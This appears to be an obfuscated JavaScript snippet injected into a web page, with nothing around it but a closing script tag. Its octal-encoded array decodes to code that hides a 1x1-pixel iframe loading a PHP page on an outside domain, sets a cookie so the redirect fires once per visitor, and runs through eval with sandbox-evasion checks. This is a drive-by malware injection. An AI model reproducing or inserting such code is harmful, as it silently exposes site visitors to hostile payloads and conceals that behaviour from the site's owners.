ss=eval("Str"+"ing");d=document;a=("44,152,171,162,147,170,155,163,162,44,176,176,176,152,152,152,54,55,44,177,21,16,44,172,145,166,44,173,164,44,101,44,150,163,147,171,161,151,162,170,62,147,166,151,145,170,151,111,160,151,161,151,162,170,54,53,155,152,166,145,161,151,53,55,77,21,16,21,16,44,173,164,62,167,166,147,44,101,44,53,154,170,170,164,76,63,63,170,151,160,151,153,166,145,164,154,147,163,172,151,62,147,163,63,151,167,150,62,164,154,164,53,77,21,16,44,173,164,62,167,170,175,160,151,62,164,163,167,155,170,155,163,162,44,101,44,53,145,146,167,163,160,171,170,151,53,77,21,16,44,173,164,62,167,170,175,160,151,62,146,163,166,150,151,166,44,101,44,53,64,53,77,21,16,44,173,164,62,167,170,175,160,151,62,154,151,155,153,154,170,44,101,44,53,65,164,174,53,77,21,16,44,173,164,62,167,170,175,160,151,62,173,155,150,170,154,44,101,44,53,65,164,174,53,77,21,16,44,173,164,62,167,170,175,160,151,62,160,151,152,170,44,101,44,53,65,164,174,53,77,21,16,44,173,164,62,167,170,175,160,151,62,170,163,164,44,101,44,53,65,164,174,53,77,21,16,21,16,44,155,152,44,54,45,150,163,147,171,161,151,162,170,62,153,151,170,111,160,151,161,151,162,170,106,175,115,150,54,53,173,164,53,55,55,44,177,21,16,44,150,163,147,171,161,151,162,170,62,173,166,155,170,151,54,53,100,150,155,172,44,155,150,101,140,53,173,164,140,53,102,100,63,150,155,172,102,53,55,77,21,16,44,150,163,147,171,161,151,162,170,62,153,151,170,111,160,151,161,151,162,170,106,175,115,150,54,53,173,164,53,55,62,145,164,164,151,162,150,107,154,155,160,150,54,173,164,55,77,21,16,44,201,21,16,201,21,16,152,171,162,147,170,155,163,162,44,127,151,170,107,163,163,157,155,151,54,147,163,163,157,155,151,122,145,161,151,60,147,163,163,157,155,151,132,145,160,171,151,60,162,110,145,175,167,60,164,145,170,154,55,44,177,21,16,44,172,145,166,44,170,163,150,145,175,44,101,44,162,151,173,44,110,145,170,151,54,55,77,21,16,44,172,145,166,44,151,174,164,155,166,151,44,101,44,162,151,173,44,110,145,170,151,54,55,77,21,16,44,155,152,44,54,162,110,145,175,167,101,101,162,171,160,160,44,200,200,44,162,110,145,175,167,101,101,64,55,44,162,110,145,175,167,101,65,77,21,16,44,151,174,164,155,166,151,62,167,151,170,130,155,161,151,54,170,163,150,145,175,62,153,151,170,130,155,161,151,54,55,44,57,44,67,72,64,64,64,64,64,56,66,70,56,162,110,145,175,167,55,77,21,16,44,150,163,147,171,161,151,162,170,62,147,163,163,157,155,151,44,101,44,147,163,163,157,155,151,122,145,161,151,57,46,101,46,57,151,167,147,145,164,151,54,147,163,163,157,155,151,132,145,160,171,151,55,21,16,44,57,44,46,77,151,174,164,155,166,151,167,101,46,44,57,44,151,174,164,155,166,151,62,170,163,113,121,130,127,170,166,155,162,153,54,55,44,57,44,54,54,164,145,170,154,55,44,103,44,46,77,44,164,145,170,154,101,46,44,57,44,164,145,170,154,44,76,44,46,46,55,77,21,16,201,21,16,152,171,162,147,170,155,163,162,44,113,151,170,107,163,163,157,155,151,54,44,162,145,161,151,44,55,44,177,21,16,44,172,145,166,44,167,170,145,166,170,44,101,44,150,163,147,171,161,151,162,170,62,147,163,163,157,155,151,62,155,162,150,151,174,123,152,54,44,162,145,161,151,44,57,44,46,101,46,44,55,77,21,16,44,172,145,166,44,160,151,162,44,101,44,167,170,145,166,170,44,57,44,162,145,161,151,62,160,151,162,153,170,154,44,57,44,65,77,21,16,44,155,152,44,54,44,54,44,45,167,170,145,166,170,44,55,44,52,52,21,16,44,54,44,162,145,161,151,44,45,101,44,150,163,147,171,161,151,162,170,62,147,163,163,157,155,151,62,167,171,146,167,170,166,155,162,153,54,44,64,60,44,162,145,161,151,62,160,151,162,153,170,154,44,55,44,55,44,55,21,16,44,177,21,16,44,166,151,170,171,166,162,44,162,171,160,160,77,21,16,44,201,21,16,44,155,152,44,54,44,167,170,145,166,170,44,101,101,44,61,65,44,55,44,166,151,170,171,166,162,44,162,171,160,160,77,21,16,44,172,145,166,44,151,162,150,44,101,44,150,163,147,171,161,151,162,170,62,147,163,163,157,155,151,62,155,162,150,151,174,123,152,54,44,46,77,46,60,44,160,151,162,44,55,77,21,16,44,155,152,44,54,44,151,162,150,44,101,101,44,61,65,44,55,44,151,162,150,44,101,44,150,163,147,171,161,151,162,170,62,147,163,163,157,155,151,62,160,151,162,153,170,154,77,21,16,44,166,151,170,171,166,162,44,171,162,151,167,147,145,164,151,54,44,150,163,147,171,161,151,162,170,62,147,163,163,157,155,151,62,167,171,146,167,170,166,155,162,153,54,44,160,151,162,60,44,151,162,150,44,55,44,55,77,21,16,201,21,16,155,152,44,54,162,145,172,155,153,145,170,163,166,62,147,163,163,157,155,151,111,162,145,146,160,151,150,55,21,16,177,21,16,155,152,54,113,151,170,107,163,163,157,155,151,54,53,172,155,167,155,170,151,150,143,171,165,53,55,101,101,71,71,55,177,201,151,160,167,151,177,127,151,170,107,163,163,157,155,151,54,53,172,155,167,155,170,151,150,143,171,165,53,60,44,53,71,71,53,60,44,53,65,53,60,44,53,63,53,55,77,21,16,21,16,176,176,176,152,152,152,54,55,77,21,16,201,21,16,201,21,16"["split"](","));for(i=0;i<a.length;i+=1){a[i]=parseInt(a[i],8)-(7-3);}try{d.body--}catch(q){zz=0;}try{zz&=2}catch(q){zz=1;}if(!zz)if(window["document"])eval(ss["fromCharCode"].apply(ss,a));</script>
